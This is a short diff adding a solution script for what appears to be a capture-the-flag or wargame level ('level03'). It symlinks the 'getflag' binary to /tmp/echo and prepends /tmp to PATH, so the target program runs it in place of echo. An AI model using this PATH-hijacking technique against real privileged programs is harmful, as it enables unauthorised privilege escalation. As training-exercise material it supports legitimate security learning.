@@ -1,0 +1,4 @@
+#VM
+ln -sf $(which getflag) /tmp/echo
+
+PATH=/tmp:$PATH ./level03
